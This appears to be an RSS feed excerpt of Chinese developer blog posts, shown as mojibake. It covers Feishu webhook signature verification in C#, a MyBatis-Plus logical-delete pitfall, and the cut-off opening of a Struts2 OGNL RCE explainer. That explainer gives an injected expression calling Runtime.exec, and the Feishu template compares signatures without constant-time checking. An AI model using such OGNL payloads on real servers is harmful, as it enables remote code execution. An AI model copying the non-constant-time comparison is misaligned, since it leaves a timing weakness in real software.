<h4 id="-ç»éª-1ä¸è¦æ³å½ç¶">ð¡ ç»éª 1ï¼ä¸è¦æ³å½ç¶</h4>
<blockquote>
<p>"æä»¥ä¸ºé£ä¹¦åºè¯¥åå¾®ä¿¡ä¸æ ·..."<br>
"æè§å¾åºè¯¥ç¨æ¢è¡ç¬¦åé..."<br>
"æçæµåºè¯¥ç¨ Verification Token..."</p>
</blockquote>
<p><strong>æè®­ï¼</strong> æ¯ä¸ªå¹³å°é½æèªå·±çå®ç°æ¹å¼ï¼ä¸è¦åºäºå¶ä»å¹³å°çç»éªååè®¾ã<strong>ä»ç»éè¯»å®æ¹ææ¡£</strong>æ¯æéè¦çã</p>
<h4 id="-ç»éª-2æ¥å¿æ¯ä½ æå¥½çæå">ð¡ ç»éª 2ï¼æ¥å¿æ¯ä½ æå¥½çæå</h4>
<p>å¨è°è¯ç­¾åéªè¯é®é¢æ¶ï¼è¯¦ç»çæ¥å¿å¸®äºæå¤§å¿ï¼</p>
<pre><code class="language-csharp">// å¥½çæ¥å¿ç¤ºä¾
_logger.LogDebug("ç­¾åå­ç¬¦ä¸²: {SignString}", signString);
_logger.LogDebug("è®¡ç®çç­¾å: {Computed}, ææçç­¾å: {Expected}", 
    computed, expected);

// ä¸å¥½çæ¥å¿ç¤ºä¾
_logger.LogError("ç­¾åéªè¯å¤±è´¥");  // æ²¡æä»»ä½æç¨ä¿¡æ¯
</code></pre>
<h4 id="-ç»éª-3å®å¨æ§åå¯ç¨æ§çå¹³è¡¡">ð¡ ç»éª 3ï¼å®å¨æ§åå¯ç¨æ§çå¹³è¡¡</h4>
<ul>
<li><strong>å¼åç¯å¢</strong>ï¼å¯ä»¥æ¾å®½éå¶ï¼æ¹ä¾¿è°è¯</li>
<li><strong>æµè¯ç¯å¢</strong>ï¼æ¥è¿çäº§ç¯å¢çéç½®</li>
<li><strong>çäº§ç¯å¢</strong>ï¼ä¸¥æ ¼çå®å¨ç­ç¥</li>
</ul>
<pre><code class="language-csharp">var toleranceSeconds = _environment.IsProduction() ? 60 : 300;
</code></pre>
<h4 id="-ç»éª-4åååæµè¯">ð¡ ç»éª 4ï¼åååæµè¯</h4>
<p>ç­¾åéªè¯çé»è¾ç¸å¯¹ç¬ç«ï¼éå¸¸éååååæµè¯ï¼</p>
<pre><code class="language-csharp">[Theory]
[InlineData(1768550348, "149323894", "go4kwHmz...", "{...}", "f2d909fb...")]
public async Task ValidateSignature_WithKnownData_ShouldMatch(
    long timestamp, string nonce, string key, string body, string expected)
{
    var result = await _validator.ValidateSignature(
        timestamp, nonce, body, expected, key);
    Assert.True(result);
}
</code></pre>
<h3 id="å»¶ä¼¸æè">å»¶ä¼¸æè</h3>
<h4 id="-ä¸ºä»ä¹é£ä¹¦ä¸ç¨-hmac-sha256">ð¤ ä¸ºä»ä¹é£ä¹¦ä¸ç¨ HMAC-SHA256ï¼</h4>
<p>HMAC-SHA256 æ¯æ´æ åçç­¾åç®æ³ï¼ä¸ºä»ä¹é£ä¹¦éæ©äºçº¯ SHA-256ï¼</p>
<p>æççæµï¼</p>
<ol>
<li><strong>æ§è½èè</strong>ï¼SHA-256 æ¯ HMAC-SHA256 ç¨å¿«</li>
<li><strong>å®ç°ç®å</strong>ï¼ä¸éè¦é¢å¤ç HMAC åº</li>
<li><strong>åå²åå </strong>ï¼å¯è½æ¯æ©æè®¾è®¡çéç</li>
</ol>
<p>ä½ä»å®å¨è§åº¦çï¼HMAC-SHA256 ä¼æ´å¥½ï¼å ä¸ºå®ä¸é¨è®¾è®¡ç¨äºæ¶æ¯è®¤è¯ã</p>
<h4 id="-ä¸ºä»ä¹è¦æå¯é¥æ¾å¨ç­¾åå­ç¬¦ä¸²é">ð¤ ä¸ºä»ä¹è¦æå¯é¥æ¾å¨ç­¾åå­ç¬¦ä¸²éï¼</h4>
<p>è¿æ¯é£ä¹¦çä¸ä¸ªç¹æ®è®¾è®¡ãéå¸¸çåæ³æ¯ï¼</p>
<ul>
<li><strong>HMAC æ¹å¼</strong>ï¼å¯é¥ä½ä¸º HMAC çå¯é¥åæ°</li>
<li><strong>é£ä¹¦æ¹å¼</strong>ï¼å¯é¥ç´æ¥æ¼æ¥å°å­ç¬¦ä¸²ä¸­</li>
</ul>
<p>è¿ç§æ¹å¼çä¼ç¹ï¼</p>
<ul>
<li>å®ç°ç®åï¼ä¸éè¦ HMAC åº</li>
<li>å¯é¥åä¸åå¸è®¡ç®ï¼æä¾äºä¸å®çå®å¨æ§</li>
</ul>
<p>ç¼ºç¹ï¼</p>
<ul>
<li>ä¸å¦ HMAC æ ååå®å¨</li>
<li>å®¹æè¢«è¯¯è§£ï¼å¾å¤äººä¼å¿è®°å å¯é¥ï¼</li>
</ul>
<h3 id="æ¨-è-èµ-æº">æ¨ è èµ æº</h3>
<p>å¦æä½ æ³æ·±å¥å­¦ä¹ ï¼è¿éæä¸äºæ¨èèµæºï¼</p>
<h4 id="-å®æ¹ææ¡£">ð å®æ¹ææ¡£</h4>
<ul>
<li><a href="https://open.feishu.cn/document/server-docs/event-subscription-guide/overview" target="_blank" rel="noopener nofollow">é£ä¹¦å¼æ¾å¹³å° - äºä»¶è®¢é</a></li>
<li><a href="https://open.feishu.cn/document/event-subscription-guide/event-subscriptions/event-subscription-configure-/choose-a-subscription-mode/send-notifications-to-developers-server" target="_blank" rel="noopener nofollow">é£ä¹¦å¼æ¾å¹³å° - ç­¾åéªè¯</a></li>
</ul>
<h4 id="ï¸-å¼æºé¡¹ç®">ð ï¸ å¼æºé¡¹ç®</h4>
<ul>
<li><a href="https://github.com/mudtools/MudFeishu" target="_blank" rel="noopener nofollow">Mud.Feishu SDK Github</a></li>
<li><a href="https://gitee.com/mudtools/MudFeishu" target="_blank" rel="noopener nofollow">Mud.Feishu SDK Gitee</a></li>
<li><a href="https://github.com/larksuite" target="_blank" rel="noopener nofollow">é£ä¹¦å®æ¹ SDK</a> - å¤è¯­è¨å®æ¹ SDK</li>
</ul>
<hr>
<h2 id="åå¨æå">åå¨æå</h2>
<p>ä»æåçç­¾åéªè¯å¤±è´¥ï¼å°æç»ææ¸æ¥ææç»èï¼è¿ä¸ªè¿ç¨è®©ææ·±å»ä½ä¼å°ï¼</p>
<blockquote>
<p><strong>ææ¯ç»èå³å®æè´¥ã</strong> ä¸ä¸ªå°å°çç®æ³å·®å¼ãä¸ä¸ªå­ç¬¦ä¸²æ ¼å¼çä¸åï¼é½å¯è½å¯¼è´åè½å®å¨æ æ³å·¥ä½ã</p>
</blockquote>
<p>å¸æè¿ç¯æç« è½å¸®å©ä½ ï¼</p>
<ul>
<li>â çè§£é£ä¹¦ Webhook ç­¾åéªè¯çå®æ´æºå¶</li>
<li>â é¿åæè¸©è¿çå</li>
<li>â å¿«éå®ä½åè§£å³ç­¾åéªè¯é®é¢</li>
<li>â æå»ºå®å¨å¯é ç Webhook æå¡</li>
</ul>
<p>å¦æä½ å¨å®ç°è¿ç¨ä¸­éå°é®é¢ï¼æ¬¢è¿å¨è¯è®ºåºçè¨è®¨è®ºãå¦æè¿ç¯æç« å¯¹ä½ æå¸®å©ï¼ä¹æ¬¢è¿åäº«ç»æ´å¤éè¦çäººã</p>
<p><strong>ç¥ä½ çé£ä¹¦éæä¹æä¸å¸é£é¡ºï¼</strong> ð</p>
<hr>
<h2 id="éå½å¿«éåè">éå½ï¼å¿«éåè</h2>
<h3 id="a-ç­¾åéªè¯ä»£ç æ¨¡æ¿c">A. ç­¾åéªè¯ä»£ç æ¨¡æ¿ï¼C#ï¼</h3>
<pre><code class="language-csharp">public async Task&lt;bool&gt; ValidateFeishuSignature(HttpRequest request)
{
    // 1. æåè¯·æ±å¤´
    var timestamp = long.Parse(request.Headers["X-Lark-Request-Timestamp"]);
    var nonce = request.Headers["X-Lark-Request-Nonce"].ToString();
    var signature = request.Headers["X-Lark-Signature"].ToString();
    
    // 2. è¯»åè¯·æ±ä½
    request.EnableBuffering();
    var body = await new StreamReader(request.Body).ReadToEndAsync();
    request.Body.Position = 0;
    
    // 3. æå»ºç­¾åå­ç¬¦ä¸²
    var signString = $"{timestamp}{nonce}{_encryptKey}{body}";
    
    // 4. è®¡ç® SHA-256
    using var sha256 = SHA256.Create();
    var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
    var computed = BitConverter.ToString(hash).Replace("-", "").ToLower();
    
    // 5. æ¯è¾ç­¾å
    return computed == signature;
}
</code></pre>
<h3 id="b-éç½®æä»¶æ¨¡æ¿">B. éç½®æä»¶æ¨¡æ¿</h3>
<pre><code class="language-json">{
  "FeishuWebhook": {
    "VerificationToken": "ä»é£ä¹¦åå°è·å",
    "EncryptKey": "ä»é£ä¹¦åå°è·åï¼32ä½ï¼",
    "RoutePrefix": "feishu/webhook",
    "TimestampToleranceSeconds": 60,
    "EnableRequestLogging": true,
    "EnableBackgroundProcessing": false
  }
}
</code></pre>
<h3 id="c-æ¯è¯­è¡¨">C. æ¯è¯­è¡¨</h3>
<table>
<thead>
<tr>
<th>æ¯è¯­</th>
<th>è±æ</th>
<th>è§£é</th>
</tr>
</thead>
<tbody>
<tr>
<td>ç­¾å</td>
<td>Signature</td>
<td>ç¨äºéªè¯æ°æ®å®æ´æ§åæ¥æºçå­ç¬¦ä¸²</td>
</tr>
<tr>
<td>åå¸</td>
<td>Hash</td>
<td>å°ä»»æé¿åº¦æ°æ®è½¬æ¢ä¸ºåºå®é¿åº¦çç®æ³</td>
</tr>
<tr>
<td>HMAC</td>
<td>Hash-based Message Authentication Code</td>
<td>åºäºåå¸çæ¶æ¯è®¤è¯ç </td>
</tr>
<tr>
<td>Nonce</td>
<td>Number used once</td>
<td>ä¸æ¬¡æ§éæºæ°ï¼ç¨äºé²éæ¾æ»å»</td>
</tr>
<tr>
<td>æ¶é´æ³</td>
<td>Timestamp</td>
<td>Unix æ¶é´æ³ï¼è¡¨ç¤ºè¯·æ±åéæ¶é´</td>
</tr>
<tr>
<td>éæ¾æ»å»</td>
<td>Replay Attack</td>
<td>éå¤åéå·²æªè·çåæ³è¯·æ±</td>
</tr>
<tr>
<td>è®¡æ¶æ»å»</td>
<td>Timing Attack</td>
<td>éè¿æµéæä½æ¶é´æ¥æ¨æ­ä¿¡æ¯</td>
</tr>
</tbody>
</table>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 16:46">2026-01-16 16:45</span>&nbsp;
<a href="https://www.cnblogs.com/mudtools">ç©æ³¥å·´ç|mudtools.cn</a>&nbsp;
éè¯»(<span id="post_view_count">78</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492945);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492945', targetLink: 'https://www.cnblogs.com/mudtools/p/19492945', title: 'æ·±å¥çè§£é£ä¹¦ Webhook ç­¾åéªè¯ï¼ä¸æ¬¡è¸©åå°å¡«åçå®æ´è®°å½' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Mybatis-Plusæ´æ°æä½æ¶çä¸ä¸ªå ]]></title>
    <link>https://www.cnblogs.com/Marktowin/p/19492834</link>
    <guid>7f7e4310647ee2cb2541a823a21fd98d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Marktowin/p/19492834" title="åå¸äº 2026-01-16 16:37">
    <span role="heading" aria-level="2">Mybatis-Plusæ´æ°æä½æ¶çä¸ä¸ªå</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p>å¨ MyBatis-Pluså¼å¯é»è¾å é¤ çæåµä¸ï¼updateByIdæ´æ°é»è¾å é¤å­æ®µæ¶ï¼ âçèµ·æ¥æ§è¡äºä½å®éä¸æ²¡ææ´æ°âçé®é¢æ¯ä¸ç§è¾ä¸ºå¸¸è§ä½ä¸æå¯è§çé®é¢ã</p>
<h3>èæ¯ï¼</h3>
<p>é¡¹ç®ä¸­ä½¿ç¨mybatis-plusä¸å·²å¼å¯é»è¾å é¤ï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> mybatis-<span style="color: rgba(0, 0, 0, 1)">plus:
</span><span style="color: rgba(0, 128, 128, 1)">2</span>   global-<span style="color: rgba(0, 0, 0, 1)">config:
</span><span style="color: rgba(0, 128, 128, 1)">3</span>     db-<span style="color: rgba(0, 0, 0, 1)">config:
</span><span style="color: rgba(0, 128, 128, 1)">4</span>       logic-delete-<span style="color: rgba(0, 0, 0, 1)">field: deleted
</span><span style="color: rgba(0, 128, 128, 1)">5</span>       logic-delete-value: 1
<span style="color: rgba(0, 128, 128, 1)">6</span>       logic-not-delete-value: 0
<span style="color: rgba(0, 128, 128, 1)">7</span>       update-strategy: not_empty   #æ´æ°ç­ç¥åªæ´æ°éç©º</pre>
</div>
<p>å¨ä»£ç ä¸­è·åè®°å½å¹¶æ´æ°é»è¾å é¤å­æ®µï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> useRecord record =<span style="color: rgba(0, 0, 0, 1)"> RecordMapper.selectOne(...); 
</span><span style="color: rgba(0, 128, 128, 1)">2</span> record.setDeleted(1<span style="color: rgba(0, 0, 0, 1)">);
</span><span style="color: rgba(0, 128, 128, 1)">3 </span>RecordMapper.updateById(record);</pre>
</div>
<p>æ§è¡ç»ææ²¡æææ¾æ¥éï¼ä¹ä¸ä¼æå¼å¸¸æ¥å¿ï¼ä½å®éæ²¡ææ´æ°é»è¾å é¤å­æ®µã</p>
<p>å¦ææ²¡æè®°å½æ§è¡è¿åå¼è¿è¡å¤æ­ï¼å°å¯¼è´é»è¾å é¤å¤±è´¥é®é¢è¢«éèï¼ä¸ºåç»­ä¸å¡åé·ã</p>
<h3>åå åæï¼</h3>
<p>mybatis-plusä½¿ç¨é»è¾å é¤èæ¯ä¸ï¼ä½¿ç¨updateByIdæ¶ï¼å¦ä¸ä»£ç æ®µï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> record.setDeleted(1<span style="color: rgba(0, 0, 0, 1)">);
</span><span style="color: rgba(0, 128, 128, 1)">2</span> RecordMapper.updateById(record);</pre>
</div>
<p>æ§è¡çsqlè¯­å¥æ¯ï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> <span style="color: rgba(0, 0, 255, 1)">UPDATE</span><span style="color: rgba(0, 0, 0, 1)"> table_name 
</span><span style="color: rgba(0, 128, 128, 1)">2</span> <span style="color: rgba(0, 0, 255, 1)">SET</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span> 
<span style="color: rgba(0, 128, 128, 1)">3</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id <span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(0, 0, 0, 1)"> ? 
</span><span style="color: rgba(0, 128, 128, 1)">4</span>   <span style="color: rgba(128, 128, 128, 1)">AND</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span>;  <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> â ï¸ MyBatis-Plus èªå¨æ·»å çæ¡ä»¶</span></pre>
</div>
<p>è¿æ¡ SQL å¨è¯­æ³å±é¢æ¯åæ³çï¼ä½å¨ MyBatis-Plus çè®¾è®¡è¯­ä¹ä¸­ï¼é»è¾å é¤å¹¶ä¸è¢«è§ä¸ºä¸æ¬¡æ®éç update æä½ã</p>
<p>MyBatis-Plus å°âå é¤âä¸âæ´æ°âå¨åé¨é»è¾ä¸è¿è¡äºåºåï¼<em>updateById è¢«è®¾è®¡ä¸ºåªè½ä½ç¨äºâæªè¢«é»è¾å é¤çæ°æ®âï¼èé»è¾å é¤æ¬èº«åºéè¿ delete ç³»åæ¹æ³è§¦åã</em></p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ä½ ææçæçSQLï¼æ¡æ¶ä¸ä¼çæï¼</span>
<span style="color: rgba(0, 128, 128, 1)">2</span> <span style="color: rgba(0, 0, 255, 1)">UPDATE</span> record <span style="color: rgba(0, 0, 255, 1)">SET</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id <span style="color: rgba(128, 128, 128, 1)">=</span> ? <span style="color: rgba(128, 128, 128, 1)">AND</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">3</span> 
<span style="color: rgba(0, 128, 128, 1)">4</span> <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> updateByIdå®éçæçSQLï¼deletedå­æ®µè¢«åé¤ï¼</span>
<span style="color: rgba(0, 128, 128, 1)">5</span> <span style="color: rgba(0, 0, 255, 1)">UPDATE</span> record <span style="color: rgba(0, 0, 255, 1)">SET</span> other_field<span style="color: rgba(128, 128, 128, 1)">=</span>? <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id <span style="color: rgba(128, 128, 128, 1)">=</span> ? <span style="color: rgba(128, 128, 128, 1)">AND</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span>;</pre>
</div>
<h3>Mybatis-Plusä¸ºä»ä¹è¦è¿æ ·è®¾è®¡ï¼</h3>
<div class="paragraph">MyBtis-Plus éµå¾ª <span>"è¯­ä¹éç¦»" åå</span></div>
<div class="table markdown-table" data-v-1afa3a17="" data-v-60fb4351=""><span class="table-title" data-v-1afa3a17=""><span class="table-title" data-v-1afa3a17=""><br></span></span>
<div class="table-container" data-v-1afa3a17="">
<table data-v-1afa3a17="">
<thead data-v-1afa3a17="">
<tr data-v-1afa3a17=""><th align="left" data-v-1afa3a17="">æä½ç±»å</th><th align="left" data-v-1afa3a17="">æ¡æ¶æ¹æ³</th><th align="left" data-v-1afa3a17="">SQLè¯­ä¹</th><th align="left" data-v-1afa3a17="">è®¾è®¡æå¾</th></tr>



</thead>
<tbody data-v-1afa3a17="">
<tr data-v-1afa3a17="">
<td align="left" data-v-1afa3a17=""><span data-v-1afa3a17="">ä¸å¡æ´æ°</span></td>
<td align="left" data-v-1afa3a17=""><code class="segment-code-inline" data-v-7caec4f8="" data-v-60fb4351="">updateById()</code></td>
<td align="left" data-v-1afa3a17="">ä¿®æ¹ä¸å¡å­æ®µ</td>
<td align="left" data-v-1afa3a17="">åªæ¹æ°æ®åå®¹ï¼ä¸æ¹æ°æ®ç¶æ</td>



</tr>
<tr data-v-1afa3a17="">
<td align="left" data-v-1afa3a17=""><span data-v-1afa3a17="">é»è¾å é¤</span></td>
<td align="left" data-v-1afa3a17=""><code class="segment-code-inline" data-v-7caec4f8="" data-v-60fb4351="">deleteById()</code></td>
<td align="left" data-v-1afa3a17=""><code class="segment-code-inline" data-v-7caec4f8="" data-v-60fb4351="">UPDATE ... SET deleted=1</code></td>
<td align="left" data-v-1afa3a17="">æ è®°æ°æ®ä¸º"å·²å é¤"ç¶æ</td>



</tr>



</tbody>



</table>



</div>



</div>
<div class="paragraph"><span>å³é®æºå¶ï¼</span></div>
<ol start="1">
<li>
<div class="paragraph">æ¦æªå¨è¿æ»¤ï¼<code class="segment-code-inline" data-v-7caec4f8="" data-v-60fb4351="">LogicDeleteInterceptor</code> ä¼èªå¨ç§»é¤ SET å­å¥ä¸­çé»è¾å é¤å­æ®µ</div>



</li>
<li>
<div class="paragraph">æ¡ä»¶è¿½å ï¼æææ¥è¯¢/æ´æ°æä½é½ä¼èªå¨è¿½å  <code class="segment-code-inline" data-v-7caec4f8="" data-v-60fb4351="">AND deleted = 0</code></div>



</li>
<li>
<div class="paragraph">ååæä½ï¼é»è¾å é¤è¢«è§ä¸º<span>ä¸å¯éæä½ï¼å é¤åä¸åºéè¿ä¸å¡ä»£ç æ¢å¤ï¼</span></div>



</li>



</ol>
<h3>å¦ä½æ­£ç¡®å¤çï¼</h3>
<ul>
<li>ä½¿ç¨ MyBatis-Plus æä¾ç deleteById è¿è¡é»è¾å é¤</li>



</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> <span style="color: rgba(128, 128, 128, 1)">//</span> æ¡æ¶ä¼èªå¨çæï¼<span style="color: rgba(0, 0, 255, 1)">UPDATE</span> <span style="color: rgba(255, 0, 255, 1)">user</span> <span style="color: rgba(0, 0, 255, 1)">SET</span> deleted<span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id<span style="color: rgba(128, 128, 128, 1)">=</span>? <span style="color: rgba(128, 128, 128, 1)">AND</span> deleted<span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span>
<span style="color: rgba(0, 128, 128, 1)">2</span> recordMapper.deleteById(1L); </pre>
</div>
<p>ããå¨å¼å¯é»è¾å é¤çåæä¸ï¼deleteById ä¸ä¼æ§è¡ç©çå é¤ï¼èæ¯ç± MyBatis-Plus èªå¨çæé»è¾å é¤ SQLï¼å¶è¯­ä¹ä¸æ¡æ¶è®¾è®¡å®å¨ä¸è´ã</p>
<ul>
<li>ç¨ LambdaUpdateWrapper æ¾å¼æ§è¡é»è¾å é¤</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span>  <span style="color: rgba(128, 128, 128, 1)">//</span><span style="color: rgba(0, 0, 0, 1)"> æå¨æå®SETå­å¥ï¼ç»è¿å­æ®µè¿æ»¤
</span><span style="color: rgba(0, 128, 128, 1)">2</span> LambdaUpdateWrapper<span style="color: rgba(128, 128, 128, 1)">&lt;</span>Record<span style="color: rgba(128, 128, 128, 1)">&gt;</span> wrapper <span style="color: rgba(128, 128, 128, 1)">=</span> new LambdaUpdateWrapper<span style="color: rgba(128, 128, 128, 1)">&lt;&gt;</span><span style="color: rgba(0, 0, 0, 1)">();
</span><span style="color: rgba(0, 128, 128, 1)">3</span> wrapper.eq(Record::getId, 1L).<span style="color: rgba(0, 0, 255, 1)">set</span>(Record::getDeleted, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span>); <span style="color: rgba(128, 128, 128, 1)">//</span><span style="color: rgba(0, 0, 0, 1)"> å¼ºå¶è®¾ç½®deletedå­æ®µ
</span><span style="color: rgba(0, 128, 128, 1)">4</span> recordMapper.<span style="color: rgba(0, 0, 255, 1)">update</span>(<span style="color: rgba(0, 0, 255, 1)">null</span>, wrapper);</pre>
</div>
<p>ããå¦æä¸å¡ä¸å¿é¡»éè¿ update çæ¹å¼å®æé»è¾å é¤ï¼å¯ä»¥ä½¿ç¨ LambdaUpdateWrapperï¼èªè¡æ§å¶ WHERE æ¡ä»¶ï¼é¿åä¸ MyBatis-Plus çèªå¨é»è¾å é¤æ¡ä»¶äº§çå²çªãæ­¤æ¹å¼ç»è¿äº updateById çåç½®é»è¾å é¤çº¦æï¼åºæç¡®å¶ç¨éï¼é¿åè¢«è¯¯ç¨ä¸ºæ®éæ´æ°ã</p>
<ul>
<li>èªå®ä¹ SQL æç¡®é»è¾å é¤è¯­</li>
</ul>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)">1</span> <span style="color: rgba(0, 128, 0, 1)">@Update</span>("<span style="color: rgba(0, 0, 255, 1)">UPDATE</span> record <span style="color: rgba(0, 0, 255, 1)">SET</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id <span style="color: rgba(128, 128, 128, 1)">=</span> #{id} <span style="color: rgba(128, 128, 128, 1)">AND</span> deleted <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span><span style="color: rgba(0, 0, 0, 1)">")
</span><span style="color: rgba(0, 128, 128, 1)">2</span> <span style="color: rgba(0, 0, 255, 1)">int</span> logicDeleteById(<span style="color: rgba(0, 0, 255, 1)">Long</span> id);</pre>
</div>
<p>ããéåå¯¹é»è¾å é¤è¡ä¸ºæå¼ºè¯­ä¹è¦æ±çé¡¹ç®ï¼ä¾¿äºä»£ç éè¯»ååæç»´æ¤ã</p>
<p>&nbsp;</p>
<h3>æ»ç»ï¼</h3>
<p>å¨ MyBatis-Plus ä¸­ï¼é»è¾å é¤ä¸æ¯ä¸æ¬¡æ®éçå­æ®µæ´æ°æä½ãupdateById è¢«è®¾è®¡ä¸ºåªè½æ´æ°âæªè¢«é»è¾å é¤çæ°æ®âï¼èä¸ç¨äºè§¦åé»è¾å é¤æ¬èº«ãå½æ´æ°è¯­å¥åæ¶å¨ SET å WHERE ä¸­æ¶åé»è¾å é¤å­æ®µæ¶ï¼å°±ä¼ä¸æ¡æ¶çè®¾è®¡è¯­ä¹äº§çå²çªãæ­£ç¡®çåæ³æ¯ä½¿ç¨ delete ç³»åæ¹æ³ï¼æéè¿ Wrapper / èªå®ä¹ SQL æç¡®è¡¨è¾¾âé»è¾å é¤âçæå¾ã</p>
<p>&nbsp;</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.017361111111111112" data-date-updated="2026-01-16 17:02">2026-01-16 16:37</span>&nbsp;
<a href="https://www.cnblogs.com/Marktowin">Marktowin</a>&nbsp;
éè¯»(<span id="post_view_count">82</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492834);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492834', targetLink: 'https://www.cnblogs.com/Marktowin/p/19492834', title: 'Mybatis-Plusæ´æ°æä½æ¶çä¸ä¸ªå' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Apache Struts2 OGNL RCEæ³¨å¥ ]]></title>
    <link>https://www.cnblogs.com/hzhsec/p/19492577</link>
    <guid>598372e94f314ce375369b1e5bdd5ad4</guid>
    <description>
    <![CDATA[ 
		<h2>
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/hzhsec/p/19492577" title="åå¸äº 2026-01-16 16:02">
    <span role="heading" aria-level="2">Apache Struts2 OGNL RCEæ³¨å¥</span>
    

</a>

		</h2>
		    <div id="cnblogs_post_description" style="display: none">
        
        Apache Struts2 OGNL RCEæ¼æ´æ¯ä¸ç§ä¸¥éçè¿ç¨ä»£ç æ§è¡æ¼æ´ï¼æ»å»èéè¿æé æ¶æçOGNLè¡¨è¾¾å¼æ³¨å¥å°HTTPè¯·æ±åæ°ä¸­ï¼å©ç¨Struts2æ¡æ¶å¯¹OGNLè¡¨è¾¾å¼å¤çä¸å½çç¼ºé·ï¼ç»è¿å®å¨æ²ç®±éå¶ï¼æç»å®ç°å¨ç®æ æå¡å¨ä¸æ§è¡ä»»æç³»ç»å½ä»¤ï¼ä»èè·åæå¡å¨æ§å¶æã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="1ä»ä¹æ¯apache-struts2">1.ä»ä¹æ¯Apache Struts2?</h2>
<p>Apache Struts2ï¼ä¹ç§°ä¸º Struts2ï¼æ¯ä¸ä¸ªå¼æºç Java Web åºç¨æ¡æ¶ã<br>
å®ä¸»è¦ç¨äºæå»ºä¼ä¸çº§ <code>Java EE Web</code> åºç¨ç¨åºï¼æä¾ <code>MVC</code>ï¼<code>Model-View-Controller</code>ï¼æ¶ææ¯æï¼å¸®å©å¼åèå¿«éå¼åå¯ç»´æ¤ç Web åºç¨ã</p>
<p>Struts2 åºäº <code>OGNL</code>ï¼<code>Object-Graph Navigation Language</code>ï¼è¡¨è¾¾å¼è¯­è¨æ¥å¤çæ°æ®ç»å®ãè¡¨åéªè¯åå¨æåå®¹æ¸²æç­åè½ãå®æ¯ <code>Struts1</code> çåç»§çæ¬ï¼ä» 2006 å¹´å·¦å³å¼å§æµè¡ï¼ä½ç±äºåå²æ¼æ´è¾å¤ï¼ç°å¨è®¸å¤é¡¹ç®å·²è½¬åæ´ç°ä»£çæ¡æ¶å¦ Spring MVCã</p>
<h2 id="2åç">2.åç</h2>
<p>(1) <strong>OGNL</strong></p>
<p><strong>OGNLä¸è¦ç´ </strong></p>
<ol>
<li>
<p><strong>Expressionï¼è¡¨è¾¾å¼ï¼</strong> å­ç¬¦ä¸²å½¢å¼çæä»¤ï¼åè¯ OGNL âä½ è¦åä»ä¹âã ä¾å­ï¼<code>user.name</code>ã<code>@java.lang.Runtime@getRuntime().exec('calc')</code>ã<code>#session.get('user')</code> ç­</p>
</li>
<li>
